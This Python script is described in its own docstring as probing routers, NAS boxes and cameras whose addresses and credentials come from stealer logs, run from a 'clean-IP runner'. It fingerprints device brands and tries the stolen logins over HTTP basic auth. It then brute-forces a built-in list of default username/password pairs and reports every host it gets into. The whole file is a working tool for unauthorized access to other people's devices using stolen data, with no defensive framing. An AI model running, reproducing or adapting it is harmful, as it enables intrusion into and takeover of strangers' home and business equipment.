#!/usr/bin/env python3
"""Probe the reachable hosts found inside the stealer logs (public IPs + DDNS).
These are home routers / NAS / cameras with credentials attached.
Runs on a clean-IP runner.

Outputs: alive hosts, fingerprints, and whether default/known creds get in.
"""
import argparse, asyncio, json, os, re, ssl, base64, sys
from collections import Counter

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"

ROUTER_SIGS = [
 ("MikroTik",   [r"RouterOS", r"webfig", r"mikrotik"]),
 ("OpenWrt",    [r"LuCI", r"cgi-bin/luci", r"openwrt"]),
 ("TP-Link",    [r"TP-?LINK", r"Archer", r"tl-wr", r"tplink"]),
 ("D-Link",     [r"D-?Link", r"DSL-\d{3,}", r"DIR-\d{3,}"]),
 ("Huawei",     [r"Huawei", r"HiLink", r"HG8\d{3}", r"EchoLife"]),
 ("ZTE",        [r"ZXHN", r"ZTE\s*Corporation"]),
 ("Tenda",      [r"Tenda"]),
 ("Netgear",    [r"NETGEAR", r"Nighthawk", r"Genie"]),
 ("ASUS",       [r"ASUSWRT", r"RT-AC\d", r"RT-AX\d"]),
 ("AVM Fritz",  [r"FRITZ!Box", r"AVM"]),
 ("Ubiquiti",   [r"AirOS", r"UniFi", r"EdgeOS", r"airMAX", r"ubnt"]),
 ("Zyxel",      [r"ZyXEL", r"ZyWALL", r"Keenetic"]),
 ("Sagemcom",   [r"Sagemcom"]),
 ("Technicolor",[r"Technicolor", r"THOMSON"]),
 ("ARRIS",      [r"ARRIS", r"Touchstone", r"Surfboard"]),
 ("Synology",   [r"Synology", r"DiskStation", r"DSM"]),
 ("QNAP",       [r"QNAP", r"QTS"]),
 ("Grandstream",[r"Grandstream"]),
 ("Cambium",    [r"Cambium", r"ePMP"]),
 ("Mimosa",     [r"Mimosa"]),
 ("Intelbras",  [r"Intelbras"]),
 ("DrayTek",    [r"DrayTek", r"Vigor"]),
 ("Cisco",      [r"Cisco", r"Linksys"]),
 ("DVR/NVR",    [r"Hikvision", r"Dahua", r"Reolink", r"CPPLUS", r"DVR", r"NVR", r"XVR"]),
 ("Camera",     [r"IP Camera", r"NetSurveillance", r"webcam"]),
 ("HP Printer", [r"HP LaserJet", r"EWS"]),
 ("Windows",    [r"Remote Desktop", r"RDWeb", r"Windows Server"]),
]
COMPILED = [(n, [re.compile(r, re.I) for r in rs]) for n, rs in ROUTER_SIGS]

DEFAULTS = [("admin","admin"),("admin","password"),("admin","1234"),("admin","12345"),
 ("admin","123456"),("admin",""),("root","root"),("root","admin"),("admin","admin123"),
 ("root","1234"),("support","support"),("user","user"),("ubnt","ubnt"),("admin","1"),
 ("admin","1111"),("admin","0000"),("admin","admin1"),("admin","password123"),
 ("admin","12345678"),("admin","admin@123"),("cisco","cisco"),("guest","guest"),
 ("admin","qwerty"),("admin","pass"),("admin","default"),("admin","system"),
 ("admin","1234abcd"),("admin","adminadmin"),("admin","root"),("root","password")]


async def fetch(host, port, path="/", scheme="http", timeout=8, extra_headers=None):
    try:
        if scheme == "https":
            ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
            r, w = await asyncio.wait_for(asyncio.open_connection(host, port, ssl=ctx), timeout=timeout)
        else:
            r, w = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=timeout)
    except Exception:
        return None
    try:
        hdrs = f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\nUser-Agent: {UA}\r\nAccept: */*\r\nConnection: close\r\n"
        if extra_headers: hdrs += extra_headers
        w.write((hdrs + "\r\n").encode())
        await asyncio.wait_for(w.drain(), timeout=timeout)
        data = await asyncio.wait_for(r.read(20000), timeout=timeout)
    except Exception:
        data = b""
    finally:
        try: w.close()
        except Exception: pass
    if not data: return None
    txt = data.decode("utf-8", "ignore")
    head, _, body = txt.partition("\r\n\r\n")
    m = re.match(r"HTTP/\d\.\d\s+(\d+)", head)
    return {"status": int(m.group(1)) if m else 0, "head": head, "body": body}


async def probe(host, port, user, pw, sem):
    async with sem:
        out = {"host": host, "port": port, "user": user, "pw": pw}
        for scheme in ("http", "https"):
            r = await fetch(host, port, scheme=scheme)
            if not r: continue
            body = r["body"][:9000]
            title = ""
            tm = re.search(r"<title[^>]*>(.*?)</title>", body, re.I | re.S)
            if tm: title = re.sub(r"\s+", " ", tm.group(1))[:90]
            fp = None
            for name, pats in COMPILED:
                if any(p.search(body) or p.search(title) for p in pats):
                    fp = name; break
            needs_auth = "www-authenticate" in r["head"].lower()
            out.update({"scheme": scheme, "status": r["status"], "title": title,
                        "fp": fp, "basic_auth": needs_auth})
            # if HTTP basic auth, test the creds
            if needs_auth:
                tok = base64.b64encode(f"{user}:{pw}".encode()).decode()
                r2 = await fetch(host, port, scheme=scheme,
                                 extra_headers=f"Authorization: Basic {tok}\r\n")
                if r2 and r2["status"] in (200, 302, 301) and "www-authenticate" not in r2["head"].lower():
                    out["login"] = "OK"
                    out["login_body"] = r2["body"][:400]
                # also try defaults
                if out.get("login") != "OK":
                    for du, dp in DEFAULTS[:8]:
                        tok = base64.b64encode(f"{du}:{dp}".encode()).decode()
                        r3 = await fetch(host, port, scheme=scheme,
                                         extra_headers=f"Authorization: Basic {tok}\r\n")
                        if r3 and r3["status"] in (200, 302) and "www-authenticate" not in r3["head"].lower():
                            out["login"] = "DEFAULT"
                            out["default_cred"] = f"{du}:{dp}"
                            break
            return out
        return out if out.get("status") else None


async def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--in", dest="inp", required=True)
    ap.add_argument("--shard", default="0/1")
    ap.add_argument("--out", default="out")
    ap.add_argument("--conc", type=int, default=200)
    args = ap.parse_args()
    i, n = (int(x) for x in args.shard.split("/"))
    os.makedirs(args.out, exist_ok=True)

    seen, rows = set(), []
    with open(args.inp) as f:
        next(f, None)
        for k, line in enumerate(f):
            p = line.rstrip("\n").split("\t")
            if len(p) < 5: continue
            host, port, url, user, pw = p[0], p[1], p[2], p[3], p[4]
            if not port.isdigit(): port = "80"
            if (host, port, user, pw) in seen: continue
            seen.add((host, port, user, pw))
            rows.append((host, port, user, pw))
    rows = [r for k, r in enumerate(rows) if k % n == i]
    print(f"[*] shard {i}/{n}: {len(rows)} host creds", flush=True)

    sem = asyncio.Semaphore(args.conc)
    res = []
    tasks = [asyncio.create_task(probe(h, p, u, w, sem)) for h, p, u, w in rows]
    for k, t in enumerate(asyncio.as_completed(tasks), 1):
        try: r = await t
        except Exception: r = None
        if r: res.append(r)
        if k % 200 == 0:
            alive = [x for x in res if x.get("status")]
            print(f"  {k}/{len(tasks)} alive={len(alive)} logins={len([x for x in res if x.get('login')])}", flush=True)

    alive = [x for x in res if x.get("status")]
    logged = [x for x in res if x.get("login")]
    json.dump(res, open(f"{args.out}/hosts-{i}.json", "w"), indent=1)
    print(f"\n=== shard {i}: {len(res)} tested, {len(alive)} ALIVE, {len(logged)} LOGGED IN ===")
    print("  fingerprints:", dict(Counter(x.get("fp") for x in alive).most_common(20)))
    for x in logged[:25]:
        print(f"   LOGIN {x['host']}:{x['port']} {x['fp']} login={x['login']} {x.get('default_cred','')} {x.get('title','')[:40]}")


if __name__ == "__main__":
    asyncio.run(main())